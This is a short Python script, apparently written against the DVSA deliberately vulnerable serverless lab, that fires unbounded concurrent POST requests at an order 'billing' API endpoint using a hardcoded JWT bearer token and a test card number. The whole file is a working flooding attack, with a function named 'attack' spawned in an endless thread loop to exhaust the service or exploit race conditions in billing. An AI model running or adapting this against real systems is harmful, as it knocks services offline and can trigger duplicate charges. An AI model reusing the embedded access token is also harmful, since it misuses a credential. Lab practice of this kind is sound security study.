import threading
import requests

url = "https://komsvobpwg.execute-api.us-east-1.amazonaws.com/dvsa/order"

headers = {
    "Authorization": "eyJraWQiOiJoVzhDOHBSWUtxZllnYWJJbGRNVDlNTjUxK3RnMkVPKzQ0cVdWXC9uQW1EOD0iLCJhbGciOiJSUzI1NiJ9.eyJzdWIiOiI3NDM4NzQ1OC03MGIxLTcwYWEtODlkZS1jOTMzMWU0MWM3N2QiLCJpc3MiOiJodHRwczpcL1wvY29nbml0by1pZHAudXMtZWFzdC0xLmFtYXpvbmF3cy5jb21cL3VzLWVhc3QtMV92SXk2ODRpM3YiLCJjbGllbnRfaWQiOiIzanE2dHJzczd0aTkwazVjZDFxODF1MTllMSIsIm9yaWdpbl9qdGkiOiJjMjJhOWFiYS01YzIzLTQwOTYtYjQyMy1hY2EyYjNkMGJhOTkiLCJldmVudF9pZCI6ImY1NjlmNWIxLTJmNjItNGRhMC04YWVlLTFhMjk0MjRmYjBiMSIsInRva2VuX3VzZSI6ImFjY2VzcyIsInNjb3BlIjoiYXdzLmNvZ25pdG8uc2lnbmluLnVzZXIuYWRtaW4iLCJhdXRoX3RpbWUiOjE3NzYxMDMwNTAsImV4cCI6MTc3NjM2NjA3NCwiaWF0IjoxNzc2MzYyNDc0LCJqdGkiOiI5YmQ0ZmUxZi1kOGRjLTQxMmItYTk0Ni05MWI3YTExNzJjZDgiLCJ1c2VybmFtZSI6Ijc0Mzg3NDU4LTcwYjEtNzBhYS04OWRlLWM5MzMxZTQxYzc3ZCJ9.vOrB_KvmEQ4LGh9FuvkbRBtnWevNX_eTEdQP87BKpZNlTujsmkR6AzySQnyQXNQ3sUDB11Wt6n_6QBzy6fu0EKZ1ZN1_3DNwkJe48WT1gYf4wxbZvcZpYLV5fpN4XUO_7Yv0U4Kgd8QQVadJFDMkDcrRzw2naOxJVaTyee1TO6nGHD8MpSZ0XinKUeXADz3TgMzCI3NI7l-KeBd_lGGrI2xwcNyJub2gB1lzf0I4bWg7O_WpSGEkveYss2xX1dtNQtZg0l4XFbszquVjTtkSVm5p_zruP3JGGiNx20B4aD49mAjNjCyEzgh_uIt_-LMgoK_RkxVWA2XKJtVpypS0dA",
    "Content-Type": "application/json"
}

payload = {
    "action": "billing",
    "order-id": "d8aef32a-62b8-47fd-81ba-f749e2ed5e3f",
    "data": {
        "ccn": "4242424242424242",
        "exp": "11/2026",
        "cvv": "123"
    }
}

def attack():
    try:
        r = requests.post(url, json=payload, headers=headers)
        print(r.text)
    except:
        pass

while True:
    threading.Thread(target=attack).start()
